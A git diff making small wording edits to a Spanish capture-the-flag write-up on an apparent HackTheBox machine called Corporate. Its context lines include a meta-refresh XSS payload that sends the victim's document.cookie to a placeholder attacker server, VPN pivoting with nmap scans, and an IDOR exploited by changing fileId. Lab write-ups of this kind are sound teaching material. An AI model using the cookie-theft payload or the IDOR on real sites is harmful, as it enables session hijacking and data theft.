@@ -79,7 +79,7 @@ Pero, viendo las assets que carga la página hay una que llama la atención
 
 Hay dos versiones... ¿distintas de `analytics.min.js`?
 
-Jugando con los parámetros de ambas, hay una en el que el cambio del parámetro `v` se ve reflejado, precisamente la de `/assets/js/analytics.min.js`
+Jugando con ambas, hay una en el que el cambio del parámetro `v` se ve reflejado, precisamente la de `/assets/js/analytics.min.js`
 
 ![Uh oh](/assets/writeups/corporate/6.png)
 
@@ -89,7 +89,7 @@ y efectivamente, luego de depurar y probar un rato cosas con este script, logram
 
 ![XSS](/assets/writeups/corporate/7.png)
 
-Ahora, necesitamos algo para redirigir al usuario que mira nuestros mensajes a este lugar. Esto puede hacerse fácilmente con HTML y sus etiquetas `<meta>`. Hagamos una url para sacarle sus cookies por ejemplo:
+Ahora, necesitamos algo para redirigir al usuario que mira nuestros mensajes a este lugar. Esto puede hacerse fácilmente con HTML y su etiqueta `<meta>`. Hagamos una url para sacarle sus cookies por ejemplo:
 
 ```html
 <meta http-equiv="refresh" content='0; url=http://corporate.htb/init</script><script src="/vendor/analytics.min.js"></script><script src="/assets/js/analytics.min.js?v=1));setTimeout(function(){window.location=`http://<yourserver:port>/?${document.cookie}`},3000);//"></script><style>'>
@@ -161,7 +161,7 @@ El usuario que comprometimos tiene archivos almacenados que podemos ver en la se
 
 Los otros son solo documentos de negocios y actas entre compañías. Nada de interés.
 
-Viendo este archivo OpenVPN, parece que es para conectarse a lo que se le podría llamar la Intranet de este equipo de trabajo. Utiliza el puerto 1194 por UDP que en efecto, podemos verificar que está abierto con nmap. Vamos a conectarnos a ver que hay por ahí
+Viendo este archivo OpenVPN, parece que es para conectarse a lo que se le podría llamar la Intranet de este equipo de trabajo. Utiliza el puerto 1194 por UDP que podemos verificar que está abierto con nmap. Vamos a conectarnos a ver que hay por ahí
 
 ```bash
 ❯ doas openvpn candido-hackett.ovpn 
@@ -208,7 +208,7 @@ tion, expects TLS Web Server Authentication
 
 Como podemos ver en el log de OpenVPN, se nos agregan dos rutas nuevas: `10.8.0.2/24` y `10.9.0.0/24`. La primera parece ser para los clientes y la segunda para las estaciones de trabajo.
 
-Solamente hay dos servidores disponibles, el gateway `10.8.0.1` y `10.9.0.4`:
+Solamente hay dos servidores disponibles: el gateway `10.8.0.1` y `10.9.0.4`:
 
 ```bash
 # Nmap 7.94 scan initiated Mon Dec 18 21:11:18 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports_ovpn --min-rate 200 10.8.0.1
@@ -246,7 +246,7 @@ Read data files from: /usr/bin/../share/nmap
 # Nmap done at Fri Dec 22 12:04:20 2023 -- 1 IP address (1 host up) scanned in 180.18 seconds
 ```
 
-Okay, del servidor principal podemos ver puertos que no podíamos ver antes: Por LDAP y NFS nos pide credenciales y en el 8006 hay una consola de Proxmox a la que no tenemos acceso:
+Okay, del servidor principal podemos ver puertos que no estaban abiertos antes: Por LDAP y NFS nos pide credenciales y en el 8006 hay una consola de Proxmox a la que no tenemos acceso:
 
 ![Proxmox](/assets/writeups/corporate/11.png)
 
@@ -260,9 +260,9 @@ Rellenando el email y luego interceptando la petición, podemos ver los campos:
 
 `fileId=219&email=candido.hackett%40corporate.htb`
 
-El `fileId` se ve interesante, pero aunque intentemos cambiarlo a otro Id la página nos dirá que no podemos compartirnos archivos con nosotros mismos. Parece que ver si esto es vulnerable a un IDOR necesitaremos otra cuenta... y afortunadamente como ya lo habrás notado antes, en la sección de soporte hay cerca de 5 usuarios distintos que nos pueden atender, vamos a robarle las cookies a otro e intentar hacer esto desde ahí.
+El `fileId` se ve interesante, pero aunque intentemos cambiarlo a otro Id la página nos dirá que no podemos compartirnos archivos con nosotros mismos. Parece que para ver si esto es vulnerable a un IDOR necesitaremos otra cuenta... y afortunadamente como ya lo habrás notado antes, en la sección de soporte hay cerca de 5 usuarios distintos que nos pueden atender, vamos a robarle las cookies a otro e intentar hacer esto desde ahí.
 
-En este caso utilizaremos a Rosalee Schmitt, al cambiar el fileId a 1 por ejemplo, aunque no se trate de un fichero de Rosalee nos lo comparte a Candido y viendo quien lo compartió:
+En este caso utilizaremos a Rosalee Schmitt; al cambiar el fileId a 1 por ejemplo, aunque no se trate de un fichero de Rosalee nos lo comparte a Candido y viendo quien lo compartió:
 
 ![IDOR](/assets/writeups/corporate/13.png)
 
